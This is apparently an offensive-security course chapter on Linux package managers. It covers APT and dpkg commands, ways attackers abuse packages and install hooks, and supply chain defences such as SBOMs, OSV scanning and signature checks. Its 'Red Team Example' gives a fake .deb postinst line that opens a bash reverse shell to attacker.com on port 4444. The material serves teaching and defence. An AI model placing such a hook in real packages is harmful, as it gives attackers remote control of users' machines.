Linux Package Managers and Dependency Abuse

Work with APT and turn package and dependency behavior into an attack surface.

5 min read 7 sections 8 code blocks Chapter 05 / 30

Package managers are central to Linux systems - and are a potential goldmine for attackers. This lesson covers how they work and how they're abused in real-world hacks.

What Is a Package Manager?#

A package manager handles:

  • Installation and removal of software
  • Dependency resolution
  • System software updates

Different distros use different managers:

  • apt → Debian-based (Ubuntu, Kali)
  • yum or dnf → RedHat, Fedora
  • pacman → Arch Linux

Key Commands (APT-based distros)#

bash
sudo apt update             # Refresh package lists
sudo apt upgrade            # Update all packages
sudo apt install <tool>     # Install software
sudo apt remove <tool>      # Uninstall
dpkg -l                     # List installed packages

Search and list packages:

text
dpkg -l | grep ssh

Inspect Installed Packages#

text
which nmap                 # Path to binary
dpkg -L nmap               # List files installed by a package

Attacker Use Cases#

Technique Description
Dependency Hijacking Create a malicious .deb file with the same name as a trusted library or dependency
Backdoored .deb Files Add preinst/postinst scripts to run payloads during install
Persistence via Updates Fake update packages that re-deploy backdoors during upgrades
Hijacking Local Repos If the system pulls from a local mirror, inject payloads via a fake repository

Practice Task#

1 - Install and inspect a tool:

bash
sudo apt install netcat
which nc
dpkg -L netcat

2 - Find scripts run during install:

bash
ls -l /var/lib/dpkg/info/netcat*.*

3 - Look inside:

bash
cat /var/lib/dpkg/info/netcat.postinst

Red Team Example#

A fake .deb package containing:

text
postinst: bash -i >& /dev/tcp/attacker.com/4444 0>&1

When installed, it gives an attacker a reverse shell.

Advanced: Modern software supply chain attacks#

Package managers are now a primary supply chain target. The 2024 xz/liblzma backdoor (CVE-2024-3094) showed how a trusted upstream maintainer account and release tarballs could inject code into a library used by sshd on several distributions. The malicious code existed in the build system and release artifacts, not in the visible Git history. The lesson is broader than one CVE: a signed distribution package is not proof that every upstream release was reviewed.

Modern attack patterns:

  • Dependency confusion: a private package name resolves to a public registry package.
  • Typosquatting and brandjacking: a name that is one character away from a trusted package.
  • Malicious install hooks: postinst, setup.py, npm install scripts and PKGBUILD functions run with your privileges.
  • Compromised maintainer accounts and release automation.
  • Unpinned transitive dependencies that change between builds.

Verification workflow:

bash
# Inventory installed packages
dpkg-query -W -f='${Package} ${Version}\n' | sort
rpm -qa --qf '%{NAME} %{VERSION}-%{RELEASE}\n' | sort

# Check file integrity against package metadata
sudo debsums -c
sudo rpm -Va

# Generate an SBOM and scan dependencies
syft dir:. -o spdx-json > sbom.spdx.json
osv-scanner scan source -r .
trivy fs --scanners vuln,secret,misconfig .

# Verify a signed artifact (key-based)
cosign verify-blob --key cosign.pub --signature artifact.sig artifact

Defensive controls:

  • Commit lockfiles and use npm ci, pip install --require-hashes, or cargo build --locked.
  • Review install hooks before running package installation as root on a production host.
  • Use signed repositories, SBOMs in SPDX or CycloneDX format, and provenance attestations such as SLSA and in-toto.
  • Build in a disposable environment and compare the result with a reproducible build.
  • Treat a new dependency as code you are about to run as root.

Lab task: pick a small Python or Node project, generate an SBOM, run an OSV scan, and identify one transitive dependency that is not pinned. Do not test malicious packages.
